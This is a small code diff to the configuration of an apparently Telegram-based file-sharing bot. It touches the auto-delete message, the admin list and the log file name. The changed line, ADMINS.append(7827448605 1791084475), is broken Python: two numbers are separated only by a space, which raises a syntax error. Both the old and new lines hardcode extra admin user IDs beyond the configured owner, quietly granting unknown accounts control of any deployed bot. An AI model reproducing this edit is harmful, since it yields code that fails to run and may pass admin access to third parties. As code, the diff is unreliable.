@@ -76,7 +76,7 @@ DEL_TIMER = int(os.environ.get("DEL_TIMER", "1600"))
 DEL_MSG = "<b>This File is deleting automatically in {time}. Forward in your Saved Messages..!</b>"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(7827448605)
+ADMINS.append(7827448605 1791084475)
 
 LOG_FILE_NAME = "savesama.txt"
 
